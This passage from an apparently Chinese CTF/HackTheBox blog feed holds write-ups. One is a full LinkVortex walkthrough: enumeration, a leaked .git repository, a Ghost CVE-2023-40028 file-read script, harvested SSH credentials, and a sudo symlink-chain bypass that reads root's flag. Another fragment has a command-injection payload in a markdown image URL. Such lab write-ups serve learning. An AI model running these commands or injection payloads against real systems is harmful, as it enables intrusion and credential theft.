class="line">&#125;</span><br></pre></td></tr></table></figure><p>note参数存在漏洞，填入![aaa](<a href="http://127.0.0.1:1337/static/style.css;cat">http://127.0.0.1:1337/static/style.css;cat</a> &#x2F;flag.txt &gt; &#x2F;app&#x2F;challenge&#x2F;static&#x2F;flag.txt)<br>访问&#x2F;static&#x2F;flag.txt得到flag</p>]]></content>
      
      
      <categories>
          
          <category> university-CTF-2024 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linkvortex-writeup</title>
      <link href="/2024/12/11/linkvortex-writeup/"/>
      <url>/2024/12/11/linkvortex-writeup/</url>
      
        <content type="html"><![CDATA[<h2><span id="目录">目录</span></h2><ul><li><a href="#user">USER</a></li><li><a href="#root">ROOT</a></li></ul><h2><span id="user">USER</span></h2><p>nmap扫描结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">└─$ nmap -sC -sV 10.10.11.47</span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-12-11 10:08 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> linkvortex.htb (10.10.11.47)</span><br><span class="line">Host is up (0.16s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)</span><br><span class="line">|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)</span><br><span class="line">53/tcp open  domain?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSVersionBindReqTCP: </span><br><span class="line">|     version</span><br><span class="line">|     <span class="built_in">bind</span></span><br><span class="line">|     root-servers</span><br><span class="line">|     nstld</span><br><span class="line">|_    verisign-grs</span><br><span class="line">80/tcp open  http    Apache httpd</span><br><span class="line">|_http-generator: Ghost 5.58</span><br><span class="line">|_http-title: BitByBit Hardware</span><br><span class="line">| http-robots.txt: 4 disallowed entries </span><br><span class="line">|_/ghost/ /p/ /email/ /r/</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port53-TCP:V=7.94%I=7%D=12/11%Time=6758F426%P=x86_64-pc-linux-gnu%r(DNS</span><br><span class="line">SF:VersionBindReqTCP,6B,<span class="string">&quot;\0i\0\x06\x85\x03\0\x01\0\0\0\x01\0\0\x07version\</span></span><br><span class="line"><span class="string">SF:x04bind\0\0\x10\0\x03\0\0\x06\0\x01\0\0\x01G\0@\x01a\x0croot-servers\x0</span></span><br><span class="line"><span class="string">SF:3net\0\x05nstld\x0cverisign-grs\x03com\0x\xa5\xa2\xa9\0\0\x07\x08\0\0\x</span></span><br><span class="line"><span class="string">SF:03\x84\0\t:\x80\0\x01Q\x80&quot;</span>)%r(DNSStatusRequestTCP,E,<span class="string">&quot;\0\x0c\0\0\x90\x0</span></span><br><span class="line"><span class="string">SF:2\0\0\0\0\0\0\0\0&quot;</span>);</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 117.97 seconds</span><br></pre></td></tr></table></figure><p>开放了80端口，初步判断有robots.txt，后端是ghost框架<br>robots.txt的内容：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Sitemap: http://linkvortex.htb/sitemap.xml</span><br><span class="line">Disallow: /ghost/</span><br><span class="line">Disallow: /p/</span><br><span class="line">Disallow: /email/</span><br><span class="line">Disallow: /r/</span><br></pre></td></tr></table></figure><p>其中有用的只有一个 &#x2F;ghost&#x2F;路由，但是先不急，在&#x2F;路由的前端先看看有没有敏感的API</p><p>1.在文章里面点击admin头像发现<a href="http://linkvortex.htb/author/admin/%E8%B7%AF%E7%94%B1">http://linkvortex.htb/author/admin/路由</a><br>2.meta标签泄露了后端的版本号5.58,这个版本是有很多CVE的<a href="https://security.snyk.io/package/npm/ghost">node CVE</a>：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;modulePrefix&quot;</span><span class="punctuation">:</span><span class="string">&quot;ghost-admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;environment&quot;</span><span class="punctuation">:</span><span class="string">&quot;production&quot;</span><span class="punctuation">,</span><span class="attr">&quot;cdnUrl&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;rootURL&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;locationType&quot;</span><span class="punctuation">:</span><span class="string">&quot;trailing-hash&quot;</span><span class="punctuation">,</span><span class="attr">&quot;EmberENV&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;FEATURES&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;EXTEND_PROTOTYPES&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;Date&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;Array&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;String&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;Function&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;_APPLICATION_TEMPLATE_WRAPPER&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;_JQUERY_INTEGRATION&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;_TEMPLATE_ONLY_GLIMMER_COMPONENTS&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;APP&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="string">&quot;5.58&quot;</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;ghost-admin&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;ember-simple-auth&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;ember-websockets&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;socketIO&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;@sentry/ember&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;disablePerformance&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;sentry&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;ember-cli-mirage&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;usingProxy&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;useDefaultPassthroughs&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;exportApplicationGlobal&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;ember-load&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;loadingIndicatorClass&quot;</span><span class="punctuation">:</span><span class="string">&quot;ember-load-indicator&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>&#x2F;的路由貌似到此为止，而测试&#x2F;ghost路由会发现所有路由都要求你登录(除了&#x2F;ghost&#x2F;api&#x2F;，但是目前没什么用)，尝试枚举一下子域名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">─$ gobuster vhost -u http://linkvortex.htb -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt --append-domain</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:             http://linkvortex.htb</span><br><span class="line">[+] Method:          GET</span><br><span class="line">[+] Threads:         10</span><br><span class="line">[+] Wordlist:        /usr/share/wordlists/amass/subdomains-top1mil-110000.txt</span><br><span class="line">[+] User Agent:      gobuster/3.6</span><br><span class="line">[+] Timeout:         10s</span><br><span class="line">[+] Append Domain:   <span class="literal">true</span></span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> VHOST enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">Found: dev.linkvortex.htb Status: 200 [Size: 2538]</span><br></pre></td></tr></table></figure><p>在&#x2F;etc&#x2F;hosts中添加dev.linkvortex.htb后访问域名发现这个域名看起来没什么功能，扫一下看看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">└─$ gobuster <span class="built_in">dir</span> -u http://dev.linkvortex.htb -w /usr/share/wordlists/dirb/common.txt -r</span><br><span class="line"></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://dev.linkvortex.htb</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Follow Redirect:         <span class="literal">true</span></span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.git/HEAD            (Status: 200) [Size: 41]</span><br><span class="line">/.htaccess            (Status: 403) [Size: 199]</span><br><span class="line">/.hta                 (Status: 403) [Size: 199]</span><br><span class="line">/.htpasswd            (Status: 403) [Size: 199]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在&#x2F;.git&#x2F;config发现git泄露<a href="https://github.com/TryGhost/Ghost.git">https://github.com/TryGhost/Ghost.git</a><br>用git-dumper把它下载下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git-dumper http://dev.linkvortex.htb/.git ./site</span><br></pre></td></tr></table></figure><p>然后进入site目录会发现文件非常多,其中有一个dockerfile，有三个重要文件&#x2F;var&#x2F;lib&#x2F;ghost&#x2F;wait-for-it.sh，&#x2F;entry.sh，&#x2F;var&#x2F;lib&#x2F;ghost&#x2F;config.production.json<br>一个个去翻有点慢，尝试看能不能找到admin的登录密码： grep -r password .<br>输出内容相当多，但是翻一会就会发现有几个文件有(只放一个文件)<br>1.&#x2F;ghost&#x2F;security&#x2F;test&#x2F;tokens.test.js:            password: ‘12345678’,<br>2.&#x2F;ghost&#x2F;core&#x2F;test&#x2F;utils&#x2F;fixtures&#x2F;data-generator.js:            password: ‘Sl1m3rson99’<br>3.&#x2F;ghost&#x2F;core&#x2F;test&#x2F;utils&#x2F;fixtures&#x2F;export&#x2F;v4_export.json:            “password”: “$2a$10$GKFu8wxSXZNFF&#x2F;cEmTE0&#x2F;O1FZIz5uRGwlLmYKRicdCRR.bvBeBsJa”,<br>4.&#x2F;ghost&#x2F;core&#x2F;test&#x2F;utils&#x2F;fixtures&#x2F;filter-param&#x2F;index.js:        password: ‘$2a$10$.pZeeBE0gHXd0PTnbT&#x2F;ph.GEKgd0Wd3q2pWna3ynTGBkPKnGIKZL6’<br>5.&#x2F;ghost&#x2F;core&#x2F;test&#x2F;regression&#x2F;api&#x2F;admin&#x2F;authentication.test.js:            const password &#x3D; ‘OctopiFociPilfer45’;<br>前四个都登不进去,这些邮箱都是不存在的，拿<a href="mailto:&#x61;&#100;&#109;&#105;&#x6e;&#x40;&#108;&#x69;&#110;&#x6b;&#x76;&#x6f;&#x72;&#x74;&#x65;&#x78;&#46;&#x68;&#x74;&#x62;">&#x61;&#100;&#109;&#105;&#x6e;&#x40;&#108;&#x69;&#110;&#x6b;&#x76;&#x6f;&#x72;&#x74;&#x65;&#x78;&#46;&#x68;&#x74;&#x62;</a>和这些密码试一下会发现最后OctopiFociPilfer45可以登录<br>admin没有什么直接操作文件系统的api，这时候就可以去找CVE了<br>发现XSS和access control的对我们都没什么用注意到&lt;5.59.1存在任意读取漏洞，描述如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Affected versions of this package are vulnerable to Arbitrary File Read which allows authenticated users to upload files that are symlinks. This can be exploited to perform an arbitrary file read of any file on the host operating system.</span><br><span class="line"></span><br><span class="line">Note: Site administrators can check for exploitation of this issue by looking for unknown symlinks within Ghost&#x27;s content/ folder.</span><br></pre></td></tr></table></figure><p>我们正好拿到了一个a认证用户<br>所以我们尝试<a href="https://github.com/0xyassine/CVE-2023-40028/blob/master/CVE-2023-40028.sh">CVE-2023-40028</a><br>注意修改文件中的host<br>然后<br>.&#x2F;exp.sh -u <a href="mailto:&#97;&#x64;&#109;&#x69;&#110;&#64;&#x6c;&#105;&#110;&#x6b;&#118;&#x6f;&#x72;&#x74;&#101;&#x78;&#x2e;&#104;&#116;&#x62;">&#97;&#x64;&#109;&#x69;&#110;&#64;&#x6c;&#105;&#110;&#x6b;&#118;&#x6f;&#x72;&#x74;&#101;&#x78;&#x2e;&#104;&#116;&#x62;</a> -p OctopiFociPilfer45会得到一个伪shell能够读取文件<br>先看看哪些用户可能能够ssh:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">./exp.sh -u admin@linkvortex.htb -p OctopiFociPilfer45</span><br><span class="line">file&gt; /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">node:x:1000:1000::/home/node:/bin/bash</span><br></pre></td></tr></table></figure><p>没得到有用的用户，因为ghost是在docker里面跑的 而docker里面的node用户读不了前两个文件（权限不足）<br>“mail”: {<br>     “transport”: “SMTP”,<br>     “options”: {<br>      “service”: “Google”,<br>      “host”: “linkvortex.htb”,<br>      “port”: 587,<br>      “auth”: {<br>        “user”: “<a href="mailto:&#98;&#111;&#x62;&#x40;&#108;&#105;&#x6e;&#x6b;&#x76;&#x6f;&#x72;&#x74;&#x65;&#x78;&#46;&#x68;&#x74;&#x62;">&#98;&#111;&#x62;&#x40;&#108;&#105;&#x6e;&#x6b;&#x76;&#x6f;&#x72;&#x74;&#x65;&#x78;&#46;&#x68;&#x74;&#x62;</a>“,<br>        “pass”: “fibber-talented-worth”<br>        }<br>      }<br>    }<br>尝试ssh，发现成功,就能读user.txt了</p><h2><span id="root">ROOT</span></h2><p>在shell中去查找suid程序，发现没东西可用，再查找进程，总共只有三个进程，也没什么办法。但是貌似它是sudoers，查看sudo -l：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bob@linkvortex:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> bob on linkvortex:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT</span><br><span class="line"></span><br><span class="line">User bob may run the following commands on linkvortex:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>bob虽然是sudoers但是只能执行&#x2F;usr&#x2F;bin&#x2F;bash &#x2F;opt&#x2F;ghost&#x2F;clean_symlink.sh *.png这条命令<br>查看&#x2F;opt&#x2F;ghost&#x2F;clean_symlink.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">bob@linkvortex:~$ <span class="built_in">cat</span> /opt/ghost/clean_symlink.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">QUAR_DIR=<span class="string">&quot;/var/quarantined&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$CHECK_CONTENT</span> ];<span class="keyword">then</span></span><br><span class="line">  CHECK_CONTENT=<span class="literal">false</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">LINK=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ! [[ <span class="string">&quot;<span class="variable">$LINK</span>&quot;</span> =~ \.png$ ]]; <span class="keyword">then</span></span><br><span class="line">  /usr/bin/echo <span class="string">&quot;! First argument must be a png file !&quot;</span></span><br><span class="line">  <span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> /usr/bin/sudo /usr/bin/test -L <span class="variable">$LINK</span>;<span class="keyword">then</span></span><br><span class="line">  LINK_NAME=$(/usr/bin/basename <span class="variable">$LINK</span>)</span><br><span class="line">  LINK_TARGET=$(/usr/bin/readlink <span class="variable">$LINK</span>)</span><br><span class="line">  <span class="keyword">if</span> /usr/bin/echo <span class="string">&quot;<span class="variable">$LINK_TARGET</span>&quot;</span> | /usr/bin/grep -Eq <span class="string">&#x27;(etc|root)&#x27;</span>;<span class="keyword">then</span></span><br><span class="line">    /usr/bin/echo <span class="string">&quot;! Trying to read critical files, removing link [ <span class="variable">$LINK</span> ] !&quot;</span></span><br><span class="line">    /usr/bin/unlink <span class="variable">$LINK</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    /usr/bin/echo <span class="string">&quot;Link found [ <span class="variable">$LINK</span> ] , moving it to quarantine&quot;</span></span><br><span class="line">    /usr/bin/mv <span class="variable">$LINK</span> <span class="variable">$QUAR_DIR</span>/</span><br><span class="line">    <span class="keyword">if</span> <span class="variable">$CHECK_CONTENT</span>;<span class="keyword">then</span></span><br><span class="line">      /usr/bin/echo <span class="string">&quot;Content:&quot;</span></span><br><span class="line">      /usr/bin/cat <span class="variable">$QUAR_DIR</span>/<span class="variable">$LINK_NAME</span> 2&gt;/dev/null</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>这个脚本检查传入的参数如果是软链接是否指向etc或者root，但是readlink不会递归去获取软链接的对象，所以中间套一层软链接就可用绕过了，记得加上环境变量$CHECK_CONTENT</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bob@linkvortex:~$ <span class="built_in">export</span> CHECK_CONTENT=<span class="literal">true</span></span><br><span class="line">bob@linkvortex:~$ <span class="built_in">touch</span> link1.png</span><br><span class="line">bob@linkvortex:~$ <span class="built_in">ln</span> -sf /root/root.txt link1.png</span><br><span class="line">bob@linkvortex:~$ <span class="built_in">touch</span> link2.png</span><br><span class="line">bob@linkvortex:~$ <span class="built_in">ln</span> -sf /home/bob/link1.png link2.png</span><br><span class="line">bob@linkvortex:~$ <span class="built_in">sudo</span> bash /opt/ghost/clean_symlink.sh link2.png</span><br><span class="line">Link found [ link2.png ] , moving it to quarantine</span><br><span class="line">Content:</span><br><span class="line">c0c71b75e2b2fe359a4bfc09df9c8af4</span><br><span class="line">bob@linkvortex:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> htb-machine </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一些有用的资源列表</title>
      <link href="/2024/12/10/files/"/>
      <url>/2024/12/10/files/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="title-Directory-Treedate-2024-12-10-12-00-00"><a href="#title-Directory-Treedate-2024-12-10-12-00-00" class="headerlink" title="title: Directory Treedate: 2024-12-10 12:00:00"></a>title: Directory Tree<br>date: 2024-12-10 12:00:00</h2><!DOCTYPE html><html lang="en"><head>  <meta charset="UTF-8">  <meta name="viewport" content="width=device-width, initial-scale=1.0">  <title>Directory Tree</title></head><body>  <div id="directory-tree">    <ul id="tree"></ul>  </div>  <script>    // 获取目录树数据并渲染    dirBase="/files/";    fetch('/directory-tree.json')      .then(response => response.json())      .then(data => {        const renderTree = (node) => {          let html = `<li><a href='${node.path}'>${node.name}</a>`;          if (node.children && node.children.length > 0) {            html += '<ul>';            node.children.forEach(child => {              html += renderTree(child);            });            html += '</ul>';          }          html += '</li>';          return html;        };        // 渲染整个目录树        document.getElementById('tree').innerHTML = renderTree(data);      });  </script></body></html>]]></content>
      
      
      <categories>
          
          <category> resources </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vintage-writeup</title>
      <link href="/2024/12/10/vintage-writeup/"/>
      <url>/2024/12/10/vintage-writeup/</url>
      
        <content type="html"><![CDATA[<p>查看这个目录下的pdf:<a href="/files/machine/vintage/vintage-writeup.pdf">vintage-writep</a></p>]]></content>
      
      
      <categories>
          
          <category> htb-machine </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ArtificialUniversity-writeup</title>
      <link href="/2024/12/08/ArtificialUniversity-writeup/"/>
      <url>/2024/12/08/ArtificialUniversity-writeup/</url>
      
        <content type="html"><![CDATA[<p>不得不说，这个确实是insane难度的challenge，复杂的一批，还有各种坑</p><p>step1：注册并登录<br>step2：注意到&#x2F;checkout路由的四个参数可控，并且不提供product_id的时候generate_payment_link会使用你提供的price来创建product，我们让它是负的，后面有用<br><a href="http://192.168.205.128:1337/checkout?title=aaa&user_id=2&price=-9999&email=aaa">http://192.168.205.128:1337/checkout?title=aaa&amp;user_id=2&amp;price=-9999&amp;email=aaa</a><br>step3：&#x2F;checkout&#x2F;success 路由是一个比较重要的路由，它会检查你的order_id中price是否&lt;0(0是代码预先定义好的一个基准price,即amt_paid)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> amt_paid &gt;= order.price:</span><br><span class="line">db_session.mark_order_complete(order_id)</span><br></pre></td></tr></table></figure><p>然后如果小于0，启动一个botrunner，它会模拟firefox浏览器发起身份为admin的登录，然后浏览器中会存储admin的session，之后这个bot会访问一个url，这个url是可<br>被我们控制的<br>client.get(f”<a 